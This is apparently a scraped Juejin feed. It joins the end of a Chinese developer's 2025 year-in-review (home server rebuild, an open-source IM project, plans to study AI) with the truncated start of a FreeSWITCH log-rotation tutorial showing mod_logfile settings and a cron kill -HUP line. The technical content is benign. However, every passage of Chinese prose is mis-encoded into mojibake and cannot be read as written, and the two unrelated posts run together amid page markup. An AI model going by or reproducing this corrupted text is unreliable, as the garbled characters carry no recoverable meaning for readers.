<p>å†™è¿™äº›ä¸æ˜¯æƒ³ç‚«è€€æˆ–è€…æ ‡æ¦œè‡ªå·±ï¼Œåªæ˜¯æŠŠæˆ‘å†…å¿ƒæ„Ÿå—å†™ä¸‹æ¥ï¼Œä»…æ­¤è€Œå·²ã€‚æˆ‘è¿™ç§äººå°±å±äºé‚£ç§ ç‹ èµ·æ¥ä¸é¡¾ä¸€åˆ‡çš„æ€§æ ¼ï¼Œå¶å°”æ‡’æ•£ï¼Œç‹ èµ·æ¥è¿è‡ªå·±éƒ½æ€•çš„é‚£ç§ã€‚</p>
<h2 data-id="heading-1">äºŒã€æŒç»­åšå¼€æº</h2>
<p>é™¤äº†ä¸Šè¿°çš„å·¥ä½œå¤–ã€‚25å¹´æˆ‘æ²¡å¿˜è®°ä¸ªäººçš„æå‡ï¼Œé™¤äº†å·¥ä½œå¯¹ä¸ªäººçš„æå‡å¤–ï¼Œæˆ‘ä¸€ç›´åœ¨åšå¼€æºï¼Œå½“ç„¶å‰åŠå¹´å·¥ä½œå¿™èº«ä½“ç´¯ï¼Œä»£ç åŸºæœ¬æ²¡å’‹å†™ã€‚</p>
<h4 data-id="heading-2">æ£é¼“æœåŠ¡å™¨</h4>
<p>6æœˆä¸­æ—¬å¼€å§‹ï¼Œæˆ‘å°±ä¸šä½™æ—¶é—´å¼€å§‹æ£é¼“æ´‹åƒåœ¾äº†ï¼Œï¼ˆå…¶å®å»å¹´å®‰è£…å¥½å <a href="https://juejin.cn/post/7431543290195869746" target="_blank" title="https://juejin.cn/post/7431543290195869746">ç‚¹è¿™é‡Œçœ‹24å¹´å®‰è£…è®°å½•</a>ï¼Œå‡ ä¸ªè™šæ‹Ÿæœºå’Œç‰©ç†æœºæœ¬æ¥å¯ä»¥ä¸€ç›´ç”¨çš„ï¼Œä½†æ˜¯æ‰‹è´±åœ¨ç‰©ç†æœºä¸Šä½¿ç”¨äº†fioå‘½ä»¤ å¯¼è‡´ç‰©ç†æœºå¼€ä¸äº†æœºäº†kvmè™šæ‹Ÿçš„é‚£äº›è™šæ‹Ÿæœºè‡ªç„¶ä¹Ÿæ²¡å‘ç”¨äº†ï¼Œåœ¨æŸå®æ‰¾äº†ä¸“ä¿®æœåŠ¡å™¨çš„å¤§ä½¬ä¹Ÿæ²¡ç”¨ èŠ±äº†500å¤§æ´‹ä»–æ²¡æŠŠæ¡ æœ€ç»ˆç»™æˆ‘é€€é’±äº†ğŸ˜‚ï¼‰</p>
<p>æ²¡åŠæ³•ï¼Œåªèƒ½é‡è£…äº†ï¼Œå¦å¤–è€ƒè™‘åˆ°æœåŠ¡å™¨è¦é•¿æœŸç”¨ï¼Œå½“å‰å„æ–¹é¢ç¡¬ä»¶éƒ½æ¯”è¾ƒä½é…ï¼Œæ‰€ä»¥æˆ‘æœ‰ä¸€é¡¿ä¹°ä¹°ä¹°ï¼ˆä¸»æ¿ï¼Œæœºç®±ï¼Œå›ºæ€ï¼Œé£æ‰‡ï¼Œå†…å­˜æ¡ï¼‰æ€»æ˜¯å°±å·®E5çš„cpuå’Œé‚£ä¸ªçŸ¿å¡æ²¡æ¢ï¼Œå…¶ä»–çš„éƒ½å‡çº§äº†ã€‚ç¡¬ä»¶å‡†å¤‡å®Œä¹‹åï¼Œæˆ‘å°±å¼€å§‹è£…ç³»ç»Ÿï¼Œè¿™å›å¸å–æ•™è®­ï¼Œä¸ç”¨kvmäº† ç”¨ESXIè£…ï¼åæ¥è¯æ˜æˆ‘æ¢å¯¹äº†ï¼ŒESXIç¨³å®šï¼Œç•Œé¢å‹å¥½ï¼Œå„æ–¹é¢åŠæ‰“KVMï¼Œå“ï¼Œå¥½åæ‚”24å¹´åˆšè£…çš„æ—¶å€™æ²¡ç”¨ESXIã€‚</p>
<p>ä¸‹è¾¹æ˜¯ä¸€äº›è´­ä¹°è®°å½•å’Œå½“å‰æœºå™¨æƒ…å†µï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5db959863c74b4794b927fd4f7bfbdd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6J2O5a2Q6I6x6I6x54ix5omT5oCq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768466368&amp;x-signature=B9v%2FtoftKCntsgIfGEulVh0jiFQ%3D" alt="image.png" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd2e30e357c243eca22627b54a223763~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6J2O5a2Q6I6x6I6x54ix5omT5oCq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768466368&amp;x-signature=nVFY0WUXzoqRzKjOpDXcSCxx5LY%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-3">åšå¼€æºé¡¹ç›®IM</h4>
<p>åœ¨æ£é¼“å®ŒæœåŠ¡å™¨ä¹‹åï¼Œæˆ‘å°±å¼€å§‹äº†ä»£ç çš„ç¼–å†™ï¼Œè¿™ä¸ªé¡¹ç›®ä½œä¸ºæˆ‘çš„çˆ±å¥½æœ‰æ—¶é—´æˆ‘å°±å»åšï¼Œæœ€è¿‘å‡†å¤‡spingbootå’Œjdkå‡çº§ï¼Œå‡†å¤‡æ¥å…¥AIï¼Œ<strong>åœ¨å½“å‰è¿™ä¸ªæ—¶ä»£ï¼Œå¿…é¡»è¦å’ŒAIæ¥è½¨äº†ï¼Œè¿™æ˜¯æ¯ä¸€ä¸ªç¨‹åºå‘˜çš„å®¿å‘½å’Œä½¿å‘½ã€‚</strong></p>
<p>ä»Šå¹´æŠŠå•èŠåŸºæœ¬åšå®Œäº†ï¼Œæœ€é‡è¦çš„æ˜¯è°ƒæ•´äº†æ¶æ„ï¼Œä½¿ç”¨å’Œhbase hadoop hdfs æ¥å­˜æ¶ˆæ¯æ•°æ®ï¼Œesæ¥æœç´¢ï¼Œgrpcæ›¿æ¢æ‰äº†dubbo protobufæ›¿æ¢æ‰json ç­‰ç­‰è¯¸å¤šä¼˜åŒ–å’Œæ¶æ„è°ƒæ•´ï¼Œæ›´å¤šçš„æ¯”å¦‚åŠŸèƒ½å•¥çš„å°±ä¸ç»†è¯´äº†ï¼Œè¿™é‡Œç»™ä¸€ä¸ªä»£ç æäº¤æƒ…å†µæˆªå›¾ã€‚</p>
<p>æœåŠ¡ç«¯ä»£ç æäº¤æƒ…å†µï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bf374f127bc42c7a753fc19e633a0b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6J2O5a2Q6I6x6I6x54ix5omT5oCq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768466368&amp;x-signature=0vrou1Udk2dzqhGyh7mMUw47C9c%3D" alt="image.png" loading="lazy"/></p>
<p>å®¢æˆ·ç«¯ä»£ç æäº¤æƒ…å†µï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32446984613649bf9c32950aef3e2683~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6J2O5a2Q6I6x6I6x54ix5omT5oCq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768466368&amp;x-signature=dgXR4H3LH7nSaX0U%2Ffvc2czO8wM%3D" alt="image.png" loading="lazy"/></p>
<p>ä»Šå¹´9æœˆä»½æˆ‘è…¾å‡ºæ—¶é—´å®Œå–„äº†ä¸‹è¿™ä¸ªIMé¡¹ç›®çš„readmeå’ŒCONTRIBUTINGï¼Œ ï¼ˆå½“æ—¶è¿˜å†™äº†ç¯‡æ–‡ç« :  <a href="https://juejin.cn/post/7549107076905173028" target="_blank" title="https://juejin.cn/post/7549107076905173028">ğŸš€ğŸš€ğŸš€å—¨ï¼Œä¸€èµ·æ¥å¼€å‘ å¼€æºIMç³»ç»Ÿå‘€ï¼</a>ï¼‰ï¼Œåˆè¡·æ˜¯æƒ³çš„èƒ½æ‰¾åˆ°å¿—åŒé“åˆä¹‹äººï¼Œä½†æ˜¯æœ€ç»ˆæˆ‘å‘ç°ï¼Œå¾ˆéš¾æˆ–è€…è¯´éå¸¸éš¾æ‰¾åˆ°ã€‚æ‰€ä»¥æœ€ç»ˆæˆ‘å†³å®šè‡ªå·±ä¸€ä¸ªç»§ç»­ç»´æŠ¤ï¼Œä¸æ‰¾äº†ã€‚AIå°±æ˜¯æˆ‘æœ€å¤§çš„å¿—åŒé“åˆä¹‹äººã€‚</p>
<p><strong>è¿™æ˜¯æˆ‘çš„å¼€æºé¡¹ç›®åç«¯åœ°å€ï¼Œä¸å«Œçš„è¯ç»™ä¸ªstarç®—æ˜¯å¯¹æˆ‘çš„æ”¯æŒï¼Œï¼ˆé èº¬æ„Ÿè°¢äº†å“ˆå“ˆï¼‰</strong> ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F598572%2Fxzll-im-server" target="_blank" title="https://github.com/598572/xzll-im-server" ref="nofollow noopener noreferrer">xzll-im-server</a></p>
<h2 data-id="heading-4">ä¸‰ã€åšå®¢æ–¹é¢</h2>
<p>ä¸ªä¸­ç¼˜ç”±ï¼Œåšå®¢ä»Šå¹´å†™çš„éå¸¸å°‘ï¼Œå°‘çš„å¯æ€œã€‚ã€‚ã€‚å°±æ°´äº†4ç¯‡ã€‚</p>
<p>1ã€<a href="https://juejin.cn/post/7456851920617603107" target="_blank" title="https://juejin.cn/post/7456851920617603107">å¼ƒç”¨èŠ±ç”Ÿå£³ï¼Œæ”¹ç”¨frpå®ç°å†…ç½‘ç©¿é€ï¼Œå¥½è‡ªç”±ï¼</a></p>
<p>2ã€<a href="https://juejin.cn/post/7541239609720848420" target="_blank" title="https://juejin.cn/post/7541239609720848420">Hadoop3.3.5ã€Hbase2.6.1 é›†ç¾¤æ­å»º&amp;Phoenixä½¿ç”¨è®°å½•</a></p>
<p>3ã€<a href="https://juejin.cn/post/7549107076905173028" target="_blank" title="https://juejin.cn/post/7549107076905173028">ğŸš€ğŸš€ğŸš€å—¨ï¼Œä¸€èµ·æ¥å¼€å‘ å¼€æºIMç³»ç»Ÿå‘€ï¼</a></p>
<p>4ã€<a href="https://juejin.cn/post/7574382900860338203" target="_blank" title="https://juejin.cn/post/7574382900860338203">MinIOçš„å®‰è£…è®°å½•</a></p>
<h2 data-id="heading-5">å››ã€AIæ–¹é¢</h2>
<p>æˆ‘ä»Šå¹´7æœˆä»½ä¹Ÿçº ç»“äº†å¾ˆä¹…ï¼Œæ˜¯å…ˆå­¦AIè¿˜æ˜¯å…ˆæå¼€æºï¼Ÿ æœ€ç»ˆæˆ‘é€‰æ‹©äº†å…ˆåšå¼€æºï¼Œç„¶ååœ¨å¼€æºIMåŸºç¡€ä¸ŠæŠŠAIè½åœ°ã€‚ä½†æ˜¯å½“ä¸‹AIçš„é£åˆ®å¾—å¤ªçŒ›çƒˆï¼Œæˆ‘çš„å¼€æºIMåŠŸèƒ½ä¸Šå¯èƒ½å°±å…ˆæ”¾ä¸€æ”¾äº†ï¼Œ<strong>ç›®å‰å½“åŠ¡ä¹‹æ€¥æ˜¯å‡çº§springboot3.x ç„¶åå­¦ä¹ AIï¼Œåº”ç”¨AIåˆ°æˆ‘çš„IMé¡¹ç›®ä¸­å»ï¼Œè¿™æ˜¯æˆ‘å½“ä¸‹çš„è§„åˆ’ã€‚ä¹Ÿæ˜¯æˆ‘26å¹´çš„è§„åˆ’ã€‚</strong></p>
<p>å®é™…ä¸ŠAIçš„è¯¾æˆ‘25å¹´2æœˆä»½å°±èŠ±äº†5kå¤§æ´‹ä¹°äº†ï¼Œè¿™é‡Œä¸ºäº†å¹¿å‘Šå«Œç–‘ä¸è¯´åå­—ï¼Œæ€»æ˜¯å°±æ˜¯xxå…µçš„è¯¾ï¼Œå¦‚æœè¯´25å¹´æ˜¯åœ¨åšå‡†å¤‡ï¼Œé‚£26å¹´æˆ‘å¯èƒ½çœŸè¦å¼€å§‹å­¦äº†å“ˆå“ˆã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2675bdabe81d4555afc217ff38db723e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6J2O5a2Q6I6x6I6x54ix5omT5oCq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768466368&amp;x-signature=7%2FYbr7XUdvgYYyruDMZInWMcNvg%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">äº”ã€å…³äºä¸ªäººå’Œå®¶åº­</h2>
<p>å®¶åº­å¹¸ç¦ç¾æ»¡ï¼Œç¥å’± å®¶å’Œä¸‡äº‹å…´ã€‚</p>
ä¸ªäººèº«ä½“å¥åº·ï¼Œæ„¿æˆ‘ ä½“å¥å£®å¦‚ç‰›ã€‚<p/>
<h2 data-id="heading-7">å…­ã€26å¹´è§„åˆ’</h2>
<ol>
<li>æŒç»­å¥åº·å¹¸ç¦</li>
<li>å‡è‚¥</li>
<li>åŠªåŠ›å·¥ä½œæŒ£é’±</li>
<li>æŒç»­åšå¼€æºé¡¹ç›®IM</li>
<li>å­¦ä¹ AI</li>
<li>åº”ç”¨AIåˆ°IMä¸­å»</li>
</ol>
<h2 data-id="heading-8">æœ€å</h2>
<p><strong>æ„¿æ‰€æœ‰çš„ç¨‹åºå‘˜éƒ½æœ‰ä¸ªå¥½èº«ä½“ï¼Œæœ‰ä¸ªå¹¸ç¦çš„å®¶åº­ï¼Œè¿™æ˜¯æœ€çè´µçš„ã€‚å½“ä½ æœ‰è¿™ä¸¤æ ·æ—¶å€™ï¼Œä½ åº”è¯¥åº†å¹¸ï¼Œä½ æ‹¥æœ‰äº†è¿™ä¸–ä¸Šæœ€å®è´µçš„ä¸œè¥¿ï¼</strong></p>
<p>------    èå­è±è± ï¼Œ2026å¹´1æœˆ8æ—¥äºåŒ—äº¬ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[freeswitch-åˆçº§-01-æ—¥å¿—åˆ†å‰²]]></title>    <link>https://juejin.cn/post/7592572266754474047</link>    <guid>https://juejin.cn/post/7592572266754474047</guid>    <pubDate>2026-01-08T08:51:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592572266754474047" data-draft-id="7592805973119942662" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="freeswitch-åˆçº§-01-æ—¥å¿—åˆ†å‰²"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T08:51:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ´›ç¥ä¹ˆä¹ˆå“’"/> <meta itemprop="url" content="https://juejin.cn/user/1530137984116158"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            freeswitch-åˆçº§-01-æ—¥å¿—åˆ†å‰²
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1530137984116158/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ´›ç¥ä¹ˆä¹ˆå“’
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:51:13.000Z" title="Thu Jan 08 2026 08:51:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1ã€å‰è¨€</h2>
<p>ä½ è¿˜åœ¨ä¸ºfsæ—¥å¿—å¤ªå¤§è€Œçƒ¦æ¼ä¹ˆï¼Œè¿˜åœ¨ä¸ºfsä¸èƒ½æŒ‰å¤©åˆ†å‰²è€Œçƒ¦æ¼ä¹ˆ</p>
<p>åšä¸»ä¹‹å‰ä¸€ç›´ä¸ºå®ƒè€Œå¤´ç–¼</p>
<p>ç»è¿‡è°ƒç ”ï¼Œæ€»ç®—æ˜¯è§£å†³äº†è¿™ä¸ªå¿ƒè…¹å¤§æ‚£</p>
<h2 data-id="heading-1">2ã€æ—¥å¿—åˆ†å‰²æ–¹å¼</h2>
<h3 data-id="heading-2">2.1 mod_logfile</h3>
<p>mod_logfile æ˜¯ fsè‡ªå¸¦æ—¥å¿—ç³»ç»Ÿ</p>
<p>å¯ä»¥é€šè¿‡ ä¸‹é¢å‘½ä»¤è¿›è¡ŒåŠ è½½</p>
<pre><code class="hljs language-bash" lang="bash">./fs_cli -x <span class="hljs-string">"reload mod_logfile"</span>
</code></pre>
<p>ä¸‹é¢æ˜¯ /home/freeswitch/etc/freeswitch/autoload_configs/logfile.conf.xml çš„é»˜è®¤é…ç½®æ–‡ä»¶</p>
<pre><code class="hljs language-log" lang="log">&lt;configuration name="logfile.conf" description="File Logging"&gt;
  &lt;settings&gt;
   &lt;!-- true to auto rotate on HUP, false to open/close --&gt;
   &lt;param name="rotate-on-hup" value="true"/&gt;
  &lt;/settings&gt;
  &lt;profiles&gt;
    &lt;profile name="default"&gt;
      &lt;settings&gt;
        &lt;!-- File to log to --&gt;
        &lt;!--&lt;param name="logfile" value="/var/log/freeswitch.log"/&gt;--&gt;
        &lt;!-- At this length in bytes rotate the log file (0 for never) --&gt;
        &lt;param name="rollover" value="1048576000"/&gt;
                &lt;!-- Maximum number of log files to keep before wrapping --&gt;
                &lt;!-- If this parameter is enabled, the log filenames will not include a date stamp --&gt;
                &lt;param name="maximum-rotate" value="32"/&gt;
        &lt;!-- Prefix all log lines by the session's uuid  --&gt;
        &lt;param name="uuid" value="true" /&gt;
      &lt;/settings&gt;
      &lt;mappings&gt;
        &lt;!-- 
             name can be a file name, function name or 'all' 
             value is one or more of debug,info,notice,warning,err,crit,alert,all
             Please see comments in console.conf.xml for more information
        --&gt;
        &lt;map name="all" value="console,debug,info,notice,warning,err,crit,alert"/&gt;
      &lt;/mappings&gt;
    &lt;/profile&gt;
  &lt;/profiles&gt;
&lt;/configuration&gt;
</code></pre>
<h4 data-id="heading-3">2.1.1 ç‰¹ç‚¹</h4>
<p>mod_logfile æ”¯æŒæŒ‰ç…§å¤§å°åˆ†å‰²(ä¸æ”¯æŒæŒ‰<code>æ—¶é—´é©±åŠ¨è½®è½¬</code>)ï¼Œåˆ†å‰²çš„æ—¥å¿—é»˜è®¤æ˜¯æŒ‰ç…§æ—¶é—´ç‚¹æ¥å‘½åçš„</p>
<ul>
<li>
<p>éªŒè¯: å¯ä»¥é€šè¿‡ æŠŠ rollover çš„å€¼æ”¹æˆ 5120 ï¼Œç„¶åè½»æ¾å¾—åˆ°æ—¥å¿—åˆ†å‰²æƒ…å†µ</p>
<pre><code class="hljs language-xml" lang="xml"># ä¿®æ”¹äº†ä¸¤ä¸ªé‡è¦å‚æ•°
<span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"rollover"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"5120"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"maximum-rotate"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"3"</span>/&gt;</span>
</code></pre>
<p>ç„¶åæµ‹è¯•å¾—åˆ°ä¸‹é¢çš„æ—¥å¿—æ–‡ä»¶ï¼Œå‘ç°æ²¡æœ‰ä¿ç•™ 3ä¸ªæ—¥å¿—æ–‡ä»¶</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">è¿™æ˜¯æˆ‘æœ¬åœ°çš„æ—¥å¿—åˆ†å‰²æƒ…å†µ</span>
-rw-r--r-- 1 root root 1.2K Jan  8 15:59 freeswitch.log.2026-01-08-15-59-17.8
-rw-r--r-- 1 root root 1.1K Jan  8 15:59 freeswitch.log.2026-01-08-15-59-17.9
-rw-r--r-- 1 root root 1.1K Jan  8 15:59 freeswitch.log.2026-01-08-15-59-18.1
-rw-r--r-- 1 root root 1.1K Jan  8 15:59 freeswitch.log.2026-01-08-15-59-18.2
-rw-r--r-- 1 root root 1.1K Jan  8 15:59 freeswitch.log.2026-01-08-15-59-18.3
-rw-r--r-- 1 root root 1.1K Jan  8 15:59 freeswitch.log.2026-01-08-15-59-25.1
-rw-r--r-- 1 root root 1.1K Jan  8 15:59 freeswitch.log.2026-01-08-15-59-25.2
-rw-r--r-- 1 root root 1.1K Jan  8 15:59 freeswitch.log.2026-01-08-15-59-25.3
-rw-r--r-- 1 root root 1.1K Jan  8 15:59 freeswitch.log.2026-01-08-15-59-25.4
...
</code></pre>
<p>ä¸€ç•ªè°ƒç ”æ‰çŸ¥é“ï¼Œå¦‚æœæ˜¯ æ»šåŠ¨æŒ‰ç…§ freeswitch.log.1  freeswitch.log.2  freeswitch.log.3 è¿™ç§ï¼Œå®ƒä¸ä¼šç”Ÿæˆ  freeswitch.log.4ï¼Œè¶…è¿‡å›è‡ªåŠ¨è¦†ç›–æœ€æ—©çš„æ–‡ä»¶</p>
</li>
</ul>
<p>æ ¹æ®ä¸Šé¢ç‰¹ç‚¹ï¼Œæˆ‘ä»¬çœ‹èµ·æ¥åšä¸åˆ° æŒ‰å¤©åˆ†å‰²æ—¥å¿—äº†ï¼Œä½†æ˜¯ mod_logfile åˆ‡å‰²æ—¥å¿—é™¤äº†ä¸Šé¢çš„è‡ªåŠ¨è§¦å‘ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æœ‰åŠæ³•å¸®å®ƒè‡ªåŠ¨è§¦å‘ï¼Œæ¯”å¦‚</p>
<ul>
<li>è‡ªåŠ¨é‡å¯fs</li>
<li>æˆ–ç€ä¸é‡å¯fs, åªéœ€è¦å®šæ—¶ å‘é€ä¿¡å·ç»™FreeSWITCHï¼Œè®©å…¶é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶</li>
</ul>
<p>æˆ‘è‡ªå·±å†™äº†cron æµ‹è¯•åï¼Œç¡®å®ä¹Ÿèƒ½æŸç§ç¨‹åº¦çš„ æŒ‰æ—¶é—´è¿›è¡Œåˆ†å‰²æ—¥å¿—</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ¯å¤© 00:00 HUP FSï¼Œå¼ºåˆ¶åˆ‡æ–‡ä»¶</span>
0 0 * * * <span class="hljs-built_in">kill</span> -HUP $(pidof freeswitch)
</code></pre>
<h4 data-id="heading-4">2.1.2 ç‰¹åˆ«æ³¨æ„</h4>
<p>å¦‚æœæˆ‘ä»¬æ˜¯æŒ‰ç…§æ—¥æœŸæ¥å‘½åæ—¥å¿—ï¼Œé‚£ä¹ˆ maximum-rotate å‚æ•°å°±æ— æ•ˆäº†ï¼Œå› ä¸ºä¸ä¼šå‘¨æœŸæ€§é‡å¤æ—¥å¿—åï¼ï¼ï¼</p>
<p>éœ€è¦æˆ‘ä»¬ä½¿ç”¨åˆ°ä¸‹é¢çš„æ–¹å¼ logrotate, æˆ–è€…ä½ è‡ªå·±ç”¨åˆ«çš„æ–¹å¼æ¥æ¸…ç†è¿‡æœŸæ—¥å¿—</p>
<h3 data-id="heading-5">2.2 logrotate</h3>
<p>logrotate æ˜¯ linux ç³»ç»Ÿè‡ªå¸¦æ—¥å¿—ç³»ç»Ÿ</p>
<p>è·¯å¾„åœ¨ <code>/etc/logrotate.d/</code>ï¼Œå½“æˆ‘ä»¬éœ€è¦å¤„ç†fs çš„æ—¥å¿—æ–‡ä»¶ï¼Œåªéœ€è¦åœ¨è¯¥è·¯å¾„ä¸‹æ–°å¢ freeswitch æ–‡ä»¶</p>
